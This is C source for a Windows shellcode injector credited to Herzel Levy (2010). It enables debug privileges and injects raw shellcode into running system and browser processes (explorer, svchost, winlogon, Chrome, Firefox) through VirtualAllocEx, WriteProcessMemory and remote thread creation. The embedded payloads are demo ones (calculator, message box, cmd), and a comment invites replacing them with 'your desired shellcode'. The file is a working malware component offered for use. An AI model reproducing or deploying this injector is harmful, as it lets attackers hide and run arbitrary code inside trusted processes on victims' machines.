/*
*	Shellcode injector, coded by Herzel Levy (Hertz)
*	October 30, 2010
*/

#include "inject.h"

#include <windows.h>
#include <tchar.h>
#include <stdio.h>
#include <dos.h>
#include <tlhelp32.h>

// prototypes:
int SetDebugPrivileges();  // used in win 7 and vista to run code with admin privileges
HANDLE NtCreateThreadEx(HANDLE hProcess, LPVOID lpRemoteThreadStart, LPVOID lpRemoteCallback); 
HANDLE MyCreateRemoteThread(HANDLE hProcess, LPVOID lpRemoteThreadStart, LPVOID lpRemoteCallback);
int CheckOSVersion(void);
void CharToByte(char* chars, byte* bytes, unsigned int count);
bool InjectCode( DWORD dwProcId, int os );

// replace the following shellcode byte array into your desired shellcode array
// this shellcode spawns the calculator
BYTE calc_shellcode_XP[] = { 
	0xdb, 0xc0, 0x31, 0xc9, 0xbf, 0x7c, 0x16, 0x70, 0xcc, 0xd9, 0x74, 0x24, 0xf4, 
	0xb1, 0x1e, 0x58, 0x31, 0x78, 0x18, 0x83, 0xe8, 0xfc, 0x03, 0x78, 0x68, 0xf4, 0x85, 0x30,
	0x78, 0xbc, 0x65, 0xc9, 0x78, 0xb6, 0x23, 0xf5, 0xf3, 0xb4, 0xae, 0x7d, 0x02, 0xaa,
	0x3a, 0x32, 0x1c, 0xbf, 0x62, 0xed, 0x1d, 0x54, 0xd5, 0x66, 0x29, 0x21, 0xe7, 0x96,
	0x60, 0xf5, 0x71, 0xca, 0x06, 0x35, 0xf5, 0x14, 0xc7, 0x7c, 0xfb, 0x1b, 0x05, 0x6b,
	0xf0, 0x27, 0xdd, 0x48, 0xfd, 0x22, 0x38, 0x1b, 0xa2, 0xe8, 0xc3, 0xf7, 0x3b, 0x7a,
	0xcf, 0x4c, 0x4f, 0x23, 0xd3, 0x53, 0xa4, 0x57, 0xf7, 0xd8, 0x3b, 0x83, 0x8e, 0x83,
	0x1f, 0x57, 0x53, 0x64, 0x51, 0xa1, 0x33, 0xcd, 0xf5, 0xc6, 0xf5, 0xc1, 0x7e, 0x98,
	0xf5, 0xaa, 0xf1, 0x05, 0xa8, 0x26, 0x99, 0x3d, 0x3b, 0xc0, 0xd9, 0xfe, 0x51, 0x61,
	0xb6, 0x0e, 0x2f, 0x85, 0x19, 0x87, 0xb7, 0x78, 0x2f, 0x59, 0x90, 0x7b, 0xd7, 0x05,
	0x7f, 0xe8, 0x7b, 0xca 
};

BYTE msgbox_shellcode_Win7_32[] = {
	0x31, 0xF6, 0x56, 0x64, 0x8B, 0x76, 0x30, 0x8B, 0x76, 0x0C, 0x8B, 0x76, 0x1C, 0x8B,
	0x6E, 0x08, 0x8B, 0x36, 0x8B, 0x5D, 0x3C, 0x8B, 0x5C, 0x1D, 0x78, 0x01, 0xEB, 0x8B,
	0x4B, 0x18, 0x67, 0xE3, 0xEC, 0x8B, 0x7B, 0x20, 0x1, 0xEF, 0x8B, 0x7C, 0x8F, 0xFC,
	0x01, 0xEF, 0x31, 0xC0, 0x99, 0x32, 0x17, 0x66, 0xC1, 0xCA, 0x1, 0xAE, 0x75, 0xF7,
	0x66, 0x81, 0xFA, 0x2A, 0xB6, 0x74, 0x9, 0x66, 0x81, 0xFA, 0xAA, 0x1A, 0xE0, 0xDB,
	0x75, 0xC5, 0x8B, 0x53, 0x24, 0x1, 0xEA, 0xF, 0xB7, 0x14, 0x4A, 0x8B, 0x7B, 0x1C,
	0x1, 0xEF, 0x3, 0x2C, 0x97, 0x85, 0xF6, 0x74, 0x16, 0x68, 0x33, 0x32, 0x20, 0x20,
	0x68, 0x75, 0x73, 0x65, 0x72, 0x54, 0xFF, 0xD5, 0x95, 0x31, 0xF6, 0x56, 0xE9, 0x9F,
	0xFF, 0xFF, 0xFF, 0x68, 0x72, 0x6C, 0x64, 0x21, 0x68, 0x6F, 0x20, 0x77, 0x6F, 0x68,
	0x48, 0x65, 0x6C, 0x6C, 0x54, 0x87, 0x4, 0x24, 0x50, 0x50, 0x56, 0xFF, 0xD5, 0xCC
};

BYTE cmd_shellcode_Win7_64[] = {
	0x31, 0xC9, 0x64, 0x8B, 0x71, 0x30, 0x8B, 0x76,0x0C, 0x8B, 0x76, 0x1C, 0x8B, 0x36, 
	0x8B, 0x06, 0x8B, 0x68, 0x08, 0xEB, 0x20, 0x5B, 0x53, 0x55, 0x5B, 0x81, 0xEB, 0x11,
	0x11, 0x11, 0x11, 0x81, 0xC3, 0xDA, 0x3F, 0x1A, 0x11, 0xFF, 0xD3, 0x81, 0xC3, 0x11,
	0x11, 0x11, 0x11, 0x81, 0xEB, 0x8C, 0xCC, 0x18, 0x11, 0xFF, 0xD3, 0xE8, 0xDB, 0xFF,
	0xFF, 0xFF, 0x63, 0x6d, 0x64
};

int __cdecl inject()
{
	FreeConsole();
	bool isVistaOr7;
	bool is64bit;
	int osVersion = CheckOSVersion();
	// get system architecture
	if(sizeof(void*) == 4)
		is64bit = false; // 32bit
	else
		is64bit = true; // 64bit

	if (osVersion == 0)
		return 0;
	else if (osVersion == 1)
		isVistaOr7 = false;
	else
	{
		SetDebugPrivileges();
		isVistaOr7 = true;
		if (is64bit)
			osVersion = 4;
	}		

	PROCESSENTRY32  pe32 = { sizeof( PROCESSENTRY32 ) };
	HANDLE hSnapshot = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );

	if( hSnapshot == INVALID_HANDLE_VALUE )
		return 0;

	if( ! Process32First( hSnapshot, &pe32 ) ) {
		CloseHandle( hSnapshot );
		return 0;
	}

	do {
		if( _tcsicmp( _T( "explorer.exe" ), pe32.szExeFile ) == 0 || 
			_tcsicmp( _T( "svchost.exe" ), pe32.szExeFile ) == 0 ||
			_tcsicmp( _T( "winlogon.exe" ), pe32.szExeFile ) == 0 ||
			_tcsicmp( _T( "iexplore.exe" ), pe32.szExeFile ) == 0 ||
			_tcsicmp( _T( "firefox.exe" ), pe32.szExeFile ) == 0 || 
			_tcsicmp( _T( "chrome.exe" ), pe32.szExeFile ) == 0){
			InjectCode( pe32.th32ProcessID, osVersion );
		}
	} while( Process32Next( hSnapshot, &pe32 ) );

	CloseHandle( hSnapshot );

	return 0;
}

bool InjectCode( DWORD dwProcId, int os )
{
	//open process with proper access permissions
	HANDLE hHandle = NULL;
	if (os < 2)
		//good for Windows XP and older
		hHandle = OpenProcess( PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD, 0, dwProcId );	
	else
		//good for Windows 7 and Vista (not tested on XP or older)
		hHandle = OpenProcess( PROCESS_ALL_ACCESS, 0, dwProcId );
	
	//check if OpenProcess succeeded
	if( hHandle == INVALID_HANDLE_VALUE )
		return false;

	//allocate memory for our shellcode in the desired process's address space
	LPVOID lpShellcode = NULL;
	//choose the shellcode which suits the environment
	if (os < 2)
		lpShellcode = VirtualAllocEx( hHandle, 0, sizeof( calc_shellcode_XP ), MEM_COMMIT, PAGE_EXECUTE_READWRITE );
	else if (os < 4)
		lpShellcode = VirtualAllocEx( hHandle, 0, sizeof( msgbox_shellcode_Win7_32 ), MEM_COMMIT, PAGE_EXECUTE_READWRITE );
	else
		lpShellcode = VirtualAllocEx( hHandle, 0, sizeof( cmd_shellcode_Win7_64 ), MEM_COMMIT, PAGE_EXECUTE_READWRITE );
	
	//check if VirtualAllocEx succeeded
	if( lpShellcode == NULL) {
		CloseHandle( hHandle );
		return false;
	}

	// write the shellcode into the allocated memory space
	if (os < 2)
		WriteProcessMemory( hHandle, lpShellcode, calc_shellcode_XP, sizeof( calc_shellcode_XP ), 0 );
	else if (os < 4)
		WriteProcessMemory( hHandle, lpShellcode, msgbox_shellcode_Win7_32, sizeof( msgbox_shellcode_Win7_32 ), 0 );
	else
		WriteProcessMemory( hHandle, lpShellcode, cmd_shellcode_Win7_64, sizeof( cmd_shellcode_Win7_64 ), 0 );

	// create a thread which will execute our shellcode
	HANDLE hThread = MyCreateRemoteThread( hHandle, lpShellcode, 0 );
	if( hThread == NULL ) {
		CloseHandle( hHandle );
		return false;
	}
	return true;
}

int SetDebugPrivileges() 
{ 
	DWORD err = 0; 
	TOKEN_PRIVILEGES Debug_Privileges; 
	if(!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &Debug_Privileges.Privileges[0].Luid)) return GetLastError(); 
	HANDLE hToken = 0; 
	if(!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) 
	{ 
		err = GetLastError();   
		if(hToken) CloseHandle(hToken); 
		return err; 
	} 

	Debug_Privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; 
	Debug_Privileges.PrivilegeCount = 1; 

	if(!AdjustTokenPrivileges(hToken, false, &Debug_Privileges, 0, NULL, NULL)) 
	{ 
		err = GetLastError(); 
		if(hToken) CloseHandle(hToken); 
	} 

	return err; 
}

HANDLE NtCreateThreadEx(HANDLE hProcess, LPVOID lpRemoteThreadStart, LPVOID lpRemoteCallback) 
{ 
	typedef struct 
	{ 
		ULONG Length; 
		ULONG Unknown1; 
		ULONG Unknown2; 
		PULONG Unknown3; 
		ULONG Unknown4; 
		ULONG Unknown5; 
		ULONG Unknown6; 
		PULONG Unknown7; 
		ULONG Unknown8; 

	} UNKNOWN; 

	typedef DWORD WINAPI NtCreateThreadEx_PROC( 
		PHANDLE ThreadHandle, 
		ACCESS_MASK DesiredAccess, 
		LPVOID ObjectAttributes, 
		HANDLE ProcessHandle, 
		LPTHREAD_START_ROUTINE lpStartAddress, 
		LPVOID lpParameter, 
		BOOL CreateSuspended, 
		DWORD dwStackSize, 
		DWORD Unknown1, 
		DWORD Unknown2, 
		LPVOID Unknown3 
		); 

	UNKNOWN Buffer; 
	DWORD dw0 = 0; 
	DWORD dw1 = 0; 
	memset(&Buffer, 0, sizeof(UNKNOWN)); 

	Buffer.Length = sizeof (UNKNOWN); 
	Buffer.Unknown1 = 0x10003; 
	Buffer.Unknown2 = 0x8; 
	Buffer.Unknown3 = &dw1; 
	Buffer.Unknown4 = 0; 
	Buffer.Unknown5 = 0x10004; 
	Buffer.Unknown6 = 4; 
	Buffer.Unknown7 = &dw0; 

	NtCreateThreadEx_PROC* VistaCreateThread = (NtCreateThreadEx_PROC*) GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtCreateThreadEx"); 

	if(VistaCreateThread == NULL) 
		return NULL; 

	HANDLE hRemoteThread = NULL; 
	HRESULT hRes = 0; 

	if(!SUCCEEDED(hRes = VistaCreateThread( 
		&hRemoteThread, 
		0x1FFFFF, // all access 
		NULL, 
		hProcess, 
		(LPTHREAD_START_ROUTINE)lpRemoteThreadStart, 
		lpRemoteCallback, 
		FALSE, 
		NULL, 
		NULL, 
		NULL, 
		&Buffer 
		))) 
	{ 
		return NULL; 
	} 

	return hRemoteThread; 
} 

HANDLE MyCreateRemoteThread(HANDLE hProcess, LPVOID lpRemoteThreadStart, LPVOID lpRemoteCallback) 
{ 
	if(GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtCreateThreadEx")) 
	{ 
		return NtCreateThreadEx(hProcess, lpRemoteThreadStart, lpRemoteCallback); 
	} 

	else 
	{ 
		return CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpRemoteThreadStart, lpRemoteCallback, 0, 0); 
	} 

	return NULL; 
}


int CheckOSVersion(void)
{
	/* Windows XP = 1
	* Windows Vista = 2
	* Windows 7 = 3 
	*/
	OSVERSIONINFO osver;
	osver.dwOSVersionInfoSize = sizeof(osver);
	if (GetVersionEx(&osver))
	{	
		if (!(osver.dwPlatformId == VER_PLATFORM_WIN32_NT))		
			return 0;
		if (osver.dwMajorVersion == 5)
			return 1;
		if (osver.dwMajorVersion == 6 && osver.dwMinorVersion == 0)
			return 2;
		if (osver.dwMajorVersion == 6 && osver.dwMinorVersion == 1)					
			return 3;		
	}
	else
		return 0;
}
